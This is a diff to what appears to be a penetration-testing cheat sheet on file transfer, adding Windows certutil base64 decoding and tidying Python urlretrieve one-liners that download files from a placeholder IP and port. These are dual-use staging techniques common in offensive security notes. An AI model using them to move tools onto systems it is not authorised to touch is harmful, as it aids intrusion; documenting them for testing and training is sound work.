@@ -115,25 +115,32 @@ fetch <URL>
 fetch -o <OUTPUT_FILE> http://<IP>:<PORT>/<FILE>
 ```
 
-###### echo & base64
+###### echo & base64 encoding
 
-The Linux built-ins `echo` and `base64` can be used to easily transfer files on
-Linux system. Encode the file to be transferred using base64 server-side, copy
+The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
+`certutil`can be used to easily transfer files on Linux / Windows systems.   
+
+Encode the file to be transferred using base64 server-side, copy
 it to the clipboard buffer, and decode it into a file client-side.   
 
 ```
-# Server-side
+# Server-side (Linux)
 base64 -w 0 <FILE> | xclip -selection clipboard
 
-# Client-side
-echo '<COPIED>' | base64 --decode > <OUTPUT_FILE>
+# Client-side - Linux
+echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>
+
+# Client-side - Windows
+echo <BASE64_FILECONTENT> > tmp_file_base64.txt
+certutil -decode tmp_file_base64.txt <OUTPUT_FILE>
+# del tmp_file_base64.txt
 ```
 
 ###### Python
 
 ```python
-python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUT.FILE>')"
-python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', 'out.file')"
+python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
+python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
 ```
 
 ###### Powershell
